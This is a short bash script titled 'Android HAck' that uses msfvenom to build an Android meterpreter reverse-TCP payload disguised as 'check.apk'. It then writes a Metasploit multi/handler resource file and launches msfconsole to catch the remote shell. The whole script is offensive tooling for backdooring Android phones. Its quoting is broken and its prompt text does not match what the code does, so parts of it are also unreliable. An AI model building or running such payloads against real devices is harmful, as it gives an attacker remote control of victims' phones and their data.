#!/bin/bash

clear
echo "########## Android HAck ############ 
 ######### By -> Fenil 'D Luffy :) ########
"

echo "Please be patient , Generating payload "
msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8888 -o check.apk		
check=($(ls | grep check.apk))

echo "Payload Generated "
echo "Here is your APK :" $check
read -r -p "Do you want to send the payload to /var/www/html/  now ? [y/N] " response
if [[ "$response" =~ ^([yY][eE][sS]|[yY])+$ ]]
then
     echo "Copying payload to /sdcard/ "
        mv check.apk /sdcard/
        echo "Moved "
        echo "Your Url :"" ""/sdcard/"$3".apk"
        echo "use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST" ""127.0.0.1"
set LPORT" ""8888"
exploit" | tee listenerw.rc


echo "Now Starting Msf multi/handler for the above !"
msfconsole -r listenerw.rc
           # touch ~/meterpreter.rc
           # echo use exploit/multi/handler > ~/meterpreter.rc
           # echo set PAYLOAD android/meterpreter/reverse_tcp >> ~/meterpreter.rc
           # echo set LHOST $ip >> ~/meterpreter.rc
           # echo set LPORT $port >> ~/meterpreter.rc
           ## echo set ExitOnSession false >> ~/meterpreter.rc
           # echo exploit -j -z >> ~/meterpreter.rc


else
    echo "Okey ! Tc"
fi
sleep 10
echo "Thank You ! "
